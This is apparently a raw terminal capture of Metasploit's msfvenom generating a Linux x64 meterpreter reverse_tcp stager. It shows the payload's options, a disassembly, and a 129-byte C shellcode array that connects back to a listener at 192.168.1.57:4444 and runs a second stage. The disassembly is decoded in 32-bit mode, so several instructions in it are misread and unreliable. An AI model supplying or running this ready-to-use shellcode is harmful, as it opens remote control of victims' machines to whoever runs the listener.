msfvenom -p linux/x64/meterpreter/reverse_tcp --list-options

Options for payload/linux/x64/meterpreter/reverse_tcp:
=========================


       Name: Linux Mettle x64, Reverse TCP Stager
     Module: payload/linux/x64/meterpreter/reverse_tcp
   Platform: Linux, Linux
       Arch: x64
Needs Admin: No
 Total size: 298
       Rank: Normal

Provided by:
    Brent Cook <bcook@rapid7.com>
    ricky
    tkmru

Basic options:
Name   Current Setting  Required  Description
----   ---------------  --------  -----------
LHOST                   yes       The listen address (an interface may be specified)
LPORT  4444             yes       The listen port

Description:
  Inject the mettle server payload (staged). Connect back to the
  attacker

msfvenom -p linux/x64/meterpreter/reverse_tcp  -a x64 --platform linux -f raw | ndisasm -u -
Payload size: 129 bytes

00000000  48                dec eax
00000001  31FF              xor edi,edi
00000003  6A09              push byte +0x9
00000005  58                pop eax
00000006  99                cdq
00000007  B610              mov dh,0x10
00000009  48                dec eax
0000000A  89D6              mov esi,edx
0000000C  4D                dec ebp
0000000D  31C9              xor ecx,ecx
0000000F  6A22              push byte +0x22
00000011  41                inc ecx
00000012  5A                pop edx
00000013  B207              mov dl,0x7
00000015  0F05              syscall
00000017  48                dec eax
00000018  85C0              test eax,eax
0000001A  7852              js 0x6e
0000001C  6A0A              push byte +0xa
0000001E  41                inc ecx
0000001F  59                pop ecx
00000020  56                push esi
00000021  50                push eax
00000022  6A29              push byte +0x29
00000024  58                pop eax
00000025  99                cdq
00000026  6A02              push byte +0x2
00000028  5F                pop edi
00000029  6A01              push byte +0x1
0000002B  5E                pop esi
0000002C  0F05              syscall
0000002E  48                dec eax
0000002F  85C0              test eax,eax
00000031  783B              js 0x6e
00000033  48                dec eax
00000034  97                xchg eax,edi
00000035  48                dec eax
00000036  B90200115C        mov ecx,0x5c110002
0000003B  C0A80139514889    shr byte [eax+0x48513901],byte 0x89
00000042  E66A              out 0x6a,al
00000044  105A6A            adc [edx+0x6a],bl
00000047  2A580F            sub bl,[eax+0xf]
0000004A  05594885C0        add eax,0xc0854859
0000004F  7925              jns 0x76
00000051  49                dec ecx
00000052  FFC9              dec ecx
00000054  7418              jz 0x6e
00000056  57                push edi
00000057  6A23              push byte +0x23
00000059  58                pop eax
0000005A  6A00              push byte +0x0
0000005C  6A05              push byte +0x5
0000005E  48                dec eax
0000005F  89E7              mov edi,esp
00000061  48                dec eax
00000062  31F6              xor esi,esi
00000064  0F05              syscall
00000066  59                pop ecx
00000067  59                pop ecx
00000068  5F                pop edi
00000069  48                dec eax
0000006A  85C0              test eax,eax
0000006C  79C7              jns 0x35
0000006E  6A3C              push byte +0x3c
00000070  58                pop eax
00000071  6A01              push byte +0x1
00000073  5F                pop edi
00000074  0F05              syscall
00000076  5E                pop esi
00000077  5A                pop edx
00000078  0F05              syscall
0000007A  48                dec eax
0000007B  85C0              test eax,eax
0000007D  78EF              js 0x6e
0000007F  FFE6              jmp esi

msfvenom -p linux/x64/meterpreter/reverse_tcp  -a x64 --platform linux -f C

No encoder or badchars specified, outputting raw payload
Payload size: 129 bytes
Final size of c file: 567 bytes
unsigned char buf[] =
"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x52\x6a\x0a"
"\x41\x59\x56\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f"
"\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00\x11\x5c\xc0"
"\xa8\x01\x39\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
"\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23\x58"
"\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59\x5f"
"\x48\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e\x5a"
"\x0f\x05\x48\x85\xc0\x78\xef\xff\xe6";
